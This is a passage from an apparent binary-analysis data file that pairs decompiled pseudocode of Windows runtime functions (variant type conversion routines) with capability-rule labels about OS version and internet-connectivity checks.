        "decompiled_code": "\nuint32_t fcn.00412694(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (18 cases) at 0x4126cd\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x48fa5c != '\\0') {\n            puStack24 = 0x412706;\n            fcn.00410e48();\n        }\n        uVar1 = 0;\n        break;\n    case 2:\n        uVar1 = in_EAX[4];\n        break;\n    default:\n        uStack28 = 0x412769;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.004120e8();\n        if (0xffff < uVar1 + 0x8000) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x10:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 346
    },
    "0041278c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041278c(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (19 cases) at 0x4127c2\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x48fa5c != '\\0') {\n            puStack24 = 0x4127f4;\n            fcn.00410e48();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x412842;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar1 = fcn.004120e8();\n        if (0xffff < uVar1) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX[4];\n    }\n    return uVar1;\n}\n",
        "token_count": 323
    },
    "00412868": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412868(void)\n\n{\n    ushort *in_EAX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    ulong uVar2;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    // switch table (20 cases) at 0x4128a3\n    switch(*in_EAX) {\n    case 0:\n        uVar1 = 0;\n        break;\n    case 1:\n        if (*0x48fa5c != '\\0') {\n            puStack24 = 0x4128dc;\n            fcn.00410e48();\n        }\n        uVar1 = 0;\n        break;\n    default:\n        uStack28 = 0x41292e;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.00412bb8();\n        uVar1 = uVar2;\n        if (uVar2 >> 0x20 != 0) {\n            uVar1 = fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n        break;\n    case 0xb:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x11:\n        uVar1 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar1 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar1 = *(in_EAX + 4);\n    }\n    return uVar1;\n}\n",
        "token_count": 369
    },
    "00412bb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00412bb8(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    uVar3 = CONCAT44(var_ch, var_10h);\n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x412fc4;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x412beb\n    switch(uVar1) {\n    case 0:\n        uVar3 = 0;\n        break;\n    case 1:\n        if (*0x48fa5c != '\\0') {\n            puStack36 = &stack0xfffffffc;\n            fcn.00410e48();\n        }\n        uVar3 = 0;\n        break;\n    case 2:\n        uVar3 = in_EAX[4];\n        break;\n    case 3:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 5:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 6:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 7:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        break;\n    case 8:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00412a00();\n        break;\n    case 9:\n    case 0xd:\n        puStack36 = &stack0xfffffffc;\n        uVar3 = fcn.00412954();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.00412a00();\n        }\n        else if (uVar1 == 0x101) {\n            puStack36 = &stack0xfffffffc;\n            uVar3 = fcn.00412b00();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack36 = &stack0xfffffffc;\n            cVar2 = fcn.00412b6c();\n            if (cVar2 == '\\0') {\n                uVar3 = fcn.00412954();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x412e0f\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00412954();\n                break;\n            case 2:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 3:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 5:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 6:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 7:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                break;\n            case 8:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00412a00();\n                break;\n            case 0xb:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack36 = &stack0xfffffffc;\n                uVar3 = fcn.00412bb8();\n                break;\n            case 0x10:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                uVar3 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                uVar3 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        uVar3 = in_EAX[4];\n        break;\n    case 0xc:\n        uVar3 = fcn.00412bb8();\n        break;\n    case 0x10:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        uVar3 = in_EAX[4];\n        break;\n    case 0x13:\n        uVar3 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        uVar3 = *(in_EAX + 4);\n    }\n    *in_FS_OFFSET = uStack44;\n    return uVar3;\n}\n",
        "token_count": 1248
    },
    "004131b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.004131b0(uint32_t param_1)\n\n{\n    uint16_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint16_t *in_EAX;\n    bool bVar4;\n    uint32_t uStack8;\n    \n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x4131ca\n    switch(uVar1) {\n    case 0:\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 1:\n        if (*0x48fa5c != '\\0') {\n            fcn.00410e48();\n        }\n        uStack8 = param_1 & 0xffffff00;\n        break;\n    case 2:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 3:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 4:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413500;\n        break;\n    case 5:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413500;\n        break;\n    case 6:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413500;\n        break;\n    case 7:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != *0x413500;\n        break;\n    case 8:\n        uVar2 = fcn.00412ffc();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    case 9:\n    case 0xd:\n        uVar2 = fcn.004130c0();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            uVar2 = fcn.00412ffc();\n            uStack8 = param_1 & 0xffffff00 | uVar2;\n        }\n        else if (uVar1 == 0x101) {\n            uVar2 = fcn.00413100();\n            uStack8 = param_1 & 0xffffff00 | uVar2;\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            cVar3 = fcn.00413164();\n            uStack8 = param_1;\n            if (cVar3 == '\\0') {\n                uVar2 = fcn.004130c0();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x413390\n            switch(uVar1 & 0xbfff) {\n            default:\n                uVar2 = fcn.004130c0();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 2:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 3:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 4:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413500;\n                break;\n            case 5:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413500;\n                break;\n            case 6:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413500;\n                break;\n            case 7:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != *0x413500;\n                break;\n            case 8:\n                uVar2 = fcn.00412ffc();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 0xb:\n                uStack8 = param_1 & 0xffffff00 | 1 - (**(in_EAX + 4) == 0);\n                break;\n            case 0xc:\n                uVar2 = fcn.004131b0();\n                uStack8 = param_1 & 0xffffff00 | uVar2;\n                break;\n            case 0x10:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != '\\0';\n                break;\n            case 0x11:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != '\\0';\n                break;\n            case 0x12:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 0x13:\n                uStack8 = param_1 & 0xffffff00 | **(in_EAX + 4) != 0;\n                break;\n            case 0x14:\n                bVar4 = (*(in_EAX + 4))[1] == 0;\n                if (bVar4) {\n                    bVar4 = **(in_EAX + 4) == 0;\n                }\n                uStack8 = param_1 & 0xffffff00 | !bVar4;\n            }\n        }\n        break;\n    case 0xb:\n        uStack8 = param_1 & 0xffffff00 | 1 - (in_EAX[4] == 0);\n        break;\n    case 0xc:\n        uVar2 = fcn.004131b0();\n        uStack8 = param_1 & 0xffffff00 | uVar2;\n        break;\n    case 0x10:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x11:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != '\\0';\n        break;\n    case 0x12:\n        uStack8 = param_1 & 0xffffff00 | in_EAX[4] != 0;\n        break;\n    case 0x13:\n        uStack8 = param_1 & 0xffffff00 | *(in_EAX + 4) != 0;\n        break;\n    case 0x14:\n        bVar4 = *(in_EAX + 6) == 0;\n        if (bVar4) {\n            bVar4 = *(in_EAX + 4) == 0;\n        }\n        uStack8 = param_1 & 0xffffff00 | !bVar4;\n    }\n    return CONCAT44(uStack8, uStack8) & 0xffffffff000000ff;\n}\n",
        "token_count": 1592
    },
    "004136c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.004136c4(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    double dStack24;\n    \n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x4136e0\n    switch(uVar1) {\n    case 0:\n        dStack24 = 0.0;\n        break;\n    case 1:\n        if (*0x48fa5c != '\\0') {\n            fcn.00410e48();\n        }\n        dStack24 = 0.0;\n        break;\n    case 2:\n        dStack24 = in_EAX[4];\n        break;\n    case 3:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 4:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 5:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 6:\n        dStack24 = *(in_EAX + 4) / *0x413a38;\n        break;\n    case 7:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 8:\n        fVar3 = fcn.00413504();\n        dStack24 = fVar3;\n        break;\n    case 9:\n    case 0xd:\n        fVar3 = fcn.004135c8();\n        dStack24 = fVar3;\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            fVar3 = fcn.00413504();\n            dStack24 = fVar3;\n        }\n        else if (uVar1 == 0x101) {\n            fVar3 = fcn.00413614();\n            dStack24 = fVar3;\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            cVar2 = fcn.00413678();\n            if (cVar2 == '\\0') {\n                fVar3 = fcn.004135c8();\n                dStack24 = fVar3;\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4138bc\n            switch(uVar1 & 0xbfff) {\n            default:\n                fVar3 = fcn.004135c8();\n                dStack24 = fVar3;\n                break;\n            case 2:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 3:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 4:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 5:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 6:\n                dStack24 = **(in_EAX + 4) / *0x413a38;\n                break;\n            case 7:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 8:\n                fVar3 = fcn.00413504();\n                dStack24 = fVar3;\n                break;\n            case 0xb:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0xc:\n                fVar3 = fcn.004136c4();\n                dStack24 = fVar3;\n                break;\n            case 0x10:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x11:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x12:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x13:\n                dStack24 = **(in_EAX + 4);\n                break;\n            case 0x14:\n                dStack24 = **(in_EAX + 4);\n            }\n        }\n        break;\n    case 0xb:\n        dStack24 = in_EAX[4];\n        break;\n    case 0xc:\n        fVar3 = fcn.004136c4();\n        dStack24 = fVar3;\n        break;\n    case 0x10:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x11:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x12:\n        dStack24 = in_EAX[4];\n        break;\n    case 0x13:\n        dStack24 = *(in_EAX + 4);\n        break;\n    case 0x14:\n        dStack24 = *(in_EAX + 4);\n    }\n    return dStack24;\n}\n",
        "token_count": 1062
    },
    "00413a3c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00413a3c(void)\n\n{\n    ushort *in_EAX;\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    float var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    // switch table (21 cases) at 0x413a5e\n    switch(*in_EAX) {\n    case 0:\n        var_8h = 0.0;\n        break;\n    case 1:\n        if (*0x48fa5c != '\\0') {\n            puStack40 = 0x413ad2;\n            fcn.00410e48();\n        }\n        var_8h = 0.0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        var_8h = *(in_EAX + 4);\n        break;\n    default:\n        uStack44 = 0x413ba1;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        fVar1 = fcn.004136c4();\n        var_8h = fVar1;\n        *in_FS_OFFSET = uStack48;\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n    }\n    return var_8h;\n}\n",
        "token_count": 483
    },
    "00413e14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00413e14(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    double in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = SUB84(in_stack_ffffffe0, 0);\n    // switch table (21 cases) at 0x413e30\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x48fa5c != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x413ea8, uVar4);\n            fcn.00410e48();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n    case 6:\n        in_stack_ffffffe0 = CONCAT44(0x413ed5, uVar4);\n        fcn.00413d18();\n        break;\n    case 7:\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x413ef7, uVar4);\n        fcn.00413bcc();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x413fa0, uVar4);\n        fcn.00413d18();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x413fc0, uVar4);\n            fcn.00413bcc();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x413fd0, uVar4);\n            fcn.00413d64();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x41414a, uVar4);\n            cVar2 = fcn.00413dc8();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x414155, SUB84(in_stack_ffffffe0, 0));\n                fcn.00413d18();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x413ffa\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x41413b, uVar4);\n                fcn.00413d18();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n            case 6:\n                in_stack_ffffffe0 = CONCAT44(0x414071, uVar4);\n                fcn.00413d18();\n                break;\n            case 7:\n                break;\n            case 8:\n                in_stack_ffffffe0 = CONCAT44(0x414095, uVar4);\n                fcn.00413bcc();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x41412e, uVar4);\n                fcn.00413e14();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.00413cb8(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = fVar3;\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x413f90, uVar4);\n        fcn.00413e14();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.00413cb8(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = fVar3;\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1010
    },
    "0041437c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.0041437c(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    int64_t in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = in_stack_ffffffe0;\n    // switch table (21 cases) at 0x414398\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x48fa5c != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x414410, uVar4);\n            fcn.00410e48();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n        in_stack_ffffffe0 = CONCAT44(0x414449, uVar4);\n        fcn.00414280();\n        break;\n    case 6:\n        break;\n    case 7:\n        in_stack_ffffffe0 = CONCAT44(0x41446b, uVar4);\n        fcn.00414280();\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x41447b, uVar4);\n        fcn.00414164();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x414542, uVar4);\n        fcn.00414280();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x414562, uVar4);\n            fcn.00414164();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x414572, uVar4);\n            fcn.004142cc();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x414729, uVar4);\n            cVar2 = fcn.00414330();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x414734, in_stack_ffffffe0);\n                fcn.00414280();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x41459c\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x41471a, uVar4);\n                fcn.00414280();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n                in_stack_ffffffe0 = CONCAT44(0x41461f, uVar4);\n                fcn.00414280();\n                break;\n            case 6:\n                break;\n            case 7:\n                in_stack_ffffffe0 = CONCAT44(0x414643, uVar4);\n                fcn.00414280();\n                break;\n            case 8:\n                in_stack_ffffffe0 = CONCAT44(0x414653, uVar4);\n                fcn.00414164();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x41470d, uVar4);\n                fcn.0041437c();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.00414220(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = ROUND(fVar3);\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x414532, uVar4);\n        fcn.0041437c();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.00414220(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = ROUND(fVar3);\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1052
    },
    "004149ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004149ac(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint *puStack40;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    puStack40 = 0x4149ce;\n    var_4h = param_2;\n    var_5h = fcn.00416168();\n    if (var_5h != '\\0') {\n        puStack40 = &fcn.004149ac::pvarg;\n        puStack44 = 0x4149e0;\n        sub.oleaut32.dll_VariantInit();\n        uStack48 = 0x414a21;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        puStack44 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))();\n        fcn.00405584();\n        *in_FS_OFFSET = 0x100;\n        uStack48 = 0x414a28;\n        uStack52 = 0x414a20;\n        uVar1 = fcn.0041162c();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 332
    },
    "00414a34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00414a34(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar 